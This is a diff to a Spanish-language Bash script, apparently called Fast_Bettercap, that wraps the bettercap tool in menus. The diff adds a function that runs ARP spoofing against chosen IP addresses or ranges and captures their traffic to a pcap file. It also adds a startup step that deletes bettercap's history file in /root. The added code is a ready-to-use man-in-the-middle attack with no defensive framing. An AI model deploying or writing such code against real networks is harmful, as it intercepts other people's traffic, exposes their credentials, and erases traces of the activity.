@@ -27,6 +27,10 @@ echo -e '\e[1;33m                                ``.```  \e[0m';echo;
 
 DEPENDENCIAS() {
 clear;echo;echo -e "\e[30;48;5;82m[[[ Fast_Bettercap V0.2 ]]]\e[0m";echo;sleep 0.5
+if [ -f /root/bettercap.history ]; then
+	sudo rm /root/bettercap.history 2> /dev/null
+fi
+
 if ! hash bettercap 2>/dev/null; then
 		echo -e "\e[0;34m[[[\e[1;31mBetterap\e[0;34m]]]\e[0;37m No instalado.\e[0m";sleep 0.5
 		echo
@@ -181,8 +185,91 @@ done
 done
 }
 
+SNIFFTARGET() {
+	SET_TARGET
+	while true; do
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea guarda los paquetes capturados en un archivo (si/no) :> \e[0m"; tput sgr0
+	read SINO
+	while [[ -z "$SINO" ]]; do
+		echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio.\e[0m";
+		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea guarda los paquetes capturados en un archivo (si/no) :> \e[0m"; tput sgr0
+		read SINO
+done
+
+	 case $SINO in
+			[s]* ) echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ruta donde guardar la captura :> \e[0m"; tput sgr0
+	 				read SALIDA_FAST_BETTERCAP
+					while [[ -z "$SALIDA_FAST_BETTERCAP"  ]] || [[ ! -d "$SALIDA_FAST_BETTERCAP" ]]; do 
+							echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio, o el directorio no existe..\e[0m" 
+							echo;echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ruta donde guardar la captura :> \e[0m"; tput sgr0
+							read SALIDA_FAST_BETTERCAP
+					done
+						echo;echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ejemplo 1: 192.168.1.2-4 (rango)\e[0m"
+						echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ejemplo 2 192.168.1.3,192.168.1.5 (objetivos especificos)\e[0m";echo;
+						echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Objetivo/s:> \e[0m"; tput sgr0
+	 				read SNIFFTARGETOPCION
+					while [[ -z "$SNIFFTARGETOPCION"  ]]; do 
+							echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio...\e[0m" 
+							echo;echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Objetivo/s:> \e[0m"; tput sgr0
+							read SNIFFTARGETOPCION
+					done
+							gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.probe on; set arp.spoof.targets $SNIFFTARGETOPCION; arp.spoof on; set net.sniff.output $SALIDA_FAST_BETTERCAP/sniff_all.pcap; set net.sniff.verbose false; net.sniff on"&& clear; MENU_PRINCIPAL;
+							
+							sleep 1 ;echo;echo -e "\e[0;30m\e[42m[[[ Fast_Bettercap V0.2 ]]]\e[0m";echo;
+							echo -e "\e[0;34m[[[\e[1;32m0\e[0;34m]]]\e[0;37m Menu principal\e[0m"
+							echo -e "\e[0;34m[[[\e[1;32m99\e[0;34m]]]\e[0;37m Cerrar script\e[0m"; sleep 0.5
+while true;do
+	echo; echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Elija una opcion :> \e[0m"; tput sgr0
+	read OPCION
+		case $OPCION in
+			0)  MENU_PRINCIPAL
+			;;
+			99) exit
+			;;
+			*) echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Opcion incorrecta..\e[0m"
+			;;
+		esac 
+done 
+			;;
+		[n]* ) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on "&& clear; MENU_PRINCIPAL;
+			;;	
+			* ) echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Solo escriba si/s/ no/n\e[0m";
+			;;
+	esac
+done
+
+
+}
+
+
+SNIFF_MENU() {
+	echo;echo -e "\e[0;34m[[[\e[1;32m0. \e[0;34m]]]\e[0;37m Sniff all (sniffear toda la red ) \e[0m"
+	echo -e "\e[0;34m[[[\e[1;32m1. \e[0;34m]]]\e[0;37m Sniff target (Snifear uno o mas objetivos) \e[0m"
+	echo -e "\e[0;34m[[[\e[1;32m2. \e[0;34m]]]\e[0;37m Menu principal\e[0m"
+	echo -e "\e[0;34m[[[\e[1;31m99.\e[0;34m]]]\e[0;37m Salir\e[0m";echo;
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Betteacp_Sniff:> \e[0m"; tput sgr0
+	read SNIFFOPCION
+while [[ -z "$SNIFFOPCION" || "$SNIFFOPCION" != @(0|1|2|99|) ]]; do
+		echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m El campo esta vacio, o la \"opcion\" no corresponde al menu.\e[0m";echo
+		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Bettercap_Sniff:> \e[0m"; tput sgr0
+		read SNIFFOPCION
+done
+		while true;do
+				case $SNIFFOPCION in
+					0) SNIFFALL
+					;;
+					1) SNIFFTARGET
+					;;
+					2) MENU_PRINCIPAL
+					;;
+					99) exit
+					;;
+				esac
+		done
+}
+
 MENU_PRINCIPAL() { echo;BANNER;
-echo -e "\e[0;34m[[[\e[1;32m0. \e[0;34m]]]\e[0;37m Sniff all (sniffear toda la red ) \e[0m"
+echo -e "\e[0;34m[[[\e[1;32m0. \e[0;34m]]]\e[0;37m Sniff (Snifear la red) \e[0m"
 echo -e "\e[0;34m[[[\e[1;32m1. \e[0;34m]]]\e[0;37m Network devices (Dispositivos en la red )\e[0m"
 echo -e "\e[0;34m[[[\e[1;32m2. \e[0;34m]]]\e[0;37m Ban target (Banear uno o mas objetivos)\e[0m"
 echo -e "\e[0;34m[[[\e[1;32m3. \e[0;34m]]]\e[0;37m En desarrollo (XXXXXX)\e[0m"
@@ -197,7 +284,7 @@ while [[ -z "$MENUOPCION" || "$MENUOPCION" != @(0|1|2|3|4|99|) ]]; do
 done
 		while true;do
 				case $MENUOPCION in
-					0) SNIFFALL 
+					0) SNIFF_MENU
 					;;
 					1) HOST_UP
 					;;
